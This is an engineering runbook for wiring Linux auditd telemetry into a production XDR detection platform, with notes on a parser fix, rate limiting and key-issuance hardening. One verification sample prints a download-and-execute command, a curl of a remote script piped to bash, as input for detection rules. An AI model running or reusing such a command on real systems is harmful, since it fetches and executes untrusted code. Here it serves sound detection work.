# PRODUCTION TELEMETRY ONBOARDING — RUNBOOK (2026-06)

Authoritative values were **read from live infrastructure**, not assumed.

## 0 · Confirmed facts

| Item | Value | How it was established |
|---|---|---|
| Production API origin | **`https://nivxray.nivxforge.com`** | `XDR_PROD_API_ORIGIN` on Vercel project `nivxray-xdr-production` (`prj_Pk0KmVhZD8KwdDOxFMHfzT9xfHXZ`), scope production+preview |
| Production API live | yes | `GET /api/health` → `200 {"status":"ok","service":"nivxray-api"}` |
| Production XDR SPA | `https://xdr.nivxforge.com` (`/` → 307 → `/xdr`) | live request |
| Production backend build | **STALE — predates the P1 hardening** | `GET /api/openapi.json` → `CreateKeyBody` = `[name, description, scopes, expires_at]` (no `confirm_tenant_id`); 785 paths |
| Proof tenant | `nivx-prod-1` (dedicated, isolated from the live login tenant) | owner decision |

## 1 · Minimum viable GENUINE telemetry source — determined from the code

Inspected: `detection_content/telemetry/registry.py` (DSM resolution order
`snort-eve → windows-security-evd → linux-auditd → aws-cloudtrail →
microsoft-sysmon → cef-leef → nivxforge-linux-sensor`),
`detection_content/library/rules_enterprise.py`, `rules_edr_linux.py`.

**Every enabled rule that can fire without a vendor appliance keys on
`command_line` / `image` / `parent_image`** (`DET-EX-001/002/003/006`,
`EDR-LNX-001…005`). So the smallest genuine producer is a real Linux host
emitting **process execution** records.

Candidates evaluated honestly:

| Source | Verdict |
|---|---|
| CEF/LEEF firewall appliance | works (`cef-leef` DSM, proven in `PREVIEW_COLLECTOR_PROOF.md`) but **requires hardware the owner may not have** |
| NivXForge Linux sensor JSON pushed through the XDR ingest | **REFUSED BY DESIGN.** `nivxforge_sensor_dsm.py` reads sensor attribution from `raw._authenticated_ingest`; an event that did not arrive through the authenticated **EDR endpoint** ingest carries no attribution and the incident engine correctly declines to call it real. Not a workaround — this is the anti-fabrication guard. |
| Windows Security / Sysmon | works, but needs a Windows host + forwarder |
| **Linux `auditd` EXECVE over an XDR `syslog` collector** | **CHOSEN.** `linux-auditd` DSM is registered ahead of `cef-leef`; auditd EXECVE yields a verbatim real `command_line`, which is exactly what the enabled rules evaluate. Cost: `apt install auditd` on one Linux box the owner already has. |

### Wiring defect found and fixed while proving this
`linux-auditd` DSM **claimed** an auditd event in `supports()` (it inspects
`str(ev["raw"])`) and then its own parser rejected it —
`UNRECOGNIZED_AUDITD: Event lacks auditd type, syscall, or exe markers` —
because `xdr_ingest._raw_event_for_pipeline()` only emitted `line`, while
`LinuxAuditdParser.parse()` reads `message`. The verbatim line is now also
passed as `message` (same bytes, nothing invented). Verified:

```
dsm            linux-auditd
record_type    EXECVE
command_line   /bin/bash -c curl -s http://198.51.100.9/x.sh | bash
```

which is precisely the shape `DET-EX-006` / `EDR-LNX-003` evaluate.

## 2 · P1 protections closed BEFORE any production credential is issued

Both gaps recorded in `PREVIEW_COLLECTOR_PROOF.md` §"Remaining blockers".

### P1-a · per-key / per-tenant / per-IP rate limiting
`backend/services/machine_rate_limit.py` — MongoDB-only atomic fixed window
(`find_one_and_update` + `$inc`, upsert, `DuplicateKeyError` retry), TTL index
for **cleanup only** (enforcement is the window arithmetic, because TTL
deletion is asynchronous). Wired into `xdr_rbac.authenticate_api_key()`:

- **IP window first**, before the key is even shaped-checked, so brute-force
  probing with unknown keys is capped too.
- per-key + per-tenant windows **after** identity is proven.
- quota spent → **429** with `Retry-After` + `RateLimit-*`; limiter fault →
  **503 `RATE_LIMITER_UNAVAILABLE`** (FAIL CLOSED, never allowed through).
- Defaults (env-overridable): `ip 600`, `key 600`, `tenant 1200` per `60s`
  (`XDR_MACHINE_RATE_LIMIT_IP|KEY|TENANT`, `XDR_MACHINE_RATE_WINDOW_SECONDS`).

### P1-b · key-issuance confirmation
`POST /api/xdr/api-keys` now requires `confirm_tenant_id` (must equal the
resolved tenant) and refuses a tenant with **no** existing user / role /
collector / key unless `allow_new_tenant: true` is passed explicitly — a
mistyped `X-Tenant-Id` can no longer silently mint a live credential.
`ApiKeysBody.jsx` grew a tenant field + a type-it-again confirm field and the
submit button stays disabled until they match.

### Evidence
- `backend/tests/test_p1_machine_credential_hardening.py` — **11/11 pass**.
- Regression: `test_collector_api_key_auth.py` (33) + `test_p0sec_rbac_fail_closed.py` (21) → **56 passed**.
  `test_xdr_api_keys.py` still **7 failed** — the same pre-existing
  legacy-header count documented in `COLLECTOR_API_KEY_AUTH.md`, not a new break.
- Live preview HTTP: mismatch → `400 TENANT_CONFIRMATION_MISMATCH`; valid mint →
  `200`; authenticated ingest reaches the handler (`404 collector not found`
  for a non-existent collector); unknown key still `401`. Throwaway key deleted.
- **No incident was fabricated. No seed data. Production untouched.**

## 3 · Remaining sequence (after production carries this build)

1. Mint the ingest key in `nivx-prod-1` (`scopes: collectors.enroll,
   collectors.read`, `confirm_tenant_id: nivx-prod-1`,
   `allow_new_tenant: true`).
2. Create the collector: `POST /api/xdr/collectors`
   `{"name":"nivx-prod-1-linux-auditd","protocol":"syslog"}` → `ADOPTED`.
3. Point the real Linux host's auditd stream at
   `POST /api/xdr/ingest/telemetry` with headers
   `X-XDR-API-Key` + `X-Tenant-Id: nivx-prod-1` and envelopes
   `{"tenant_id":"nivx-prod-1","collector_id":"col_…",
     "collection_method":"syslog","source":"<hostname>",
     "raw":{"message":"<verbatim auditd line>","payload_format":"auditd"}}`.
4. Collector flips `ADOPTED → CONNECTED` **only** on real
   received/parsed/normalized counters — the admin API cannot forge it.
5. Then, long-term architecture: deploy `apps/nivxray-xdr-collector`
   (Docker, persistent volume, Fly.io/Railway/Cloud Run — **not** Vercel)
   per its `DEPLOY.md`, and set `VITE_XDR_COLLECTOR_URL` on the Vercel XDR
   project.

## 4 · THE ONE OWNER ACTION (blocking everything above)

Production still runs the pre-hardening backend, so issuing a production
ingest credential today would issue it **without** rate limiting and
**without** issuance confirmation — exactly what the owner forbade.

> **Publish this backend build to `nivxray.nivxforge.com`** (Save to GitHub →
> Deploy). Note this host also serves the Workspace CRA from `/app/frontend`,
> so the deploy republishes that frontend from current repo state as well.

Verification the owner can run afterwards (no credentials needed):

```
curl -s https://nivxray.nivxforge.com/api/openapi.json \
 | python3 -c "import sys,json;print(list(json.load(sys.stdin)['components']['schemas']['CreateKeyBody']['properties']))"
```

Expected: `['name', 'confirm_tenant_id', 'allow_new_tenant', 'description', 'scopes', 'expires_at']`
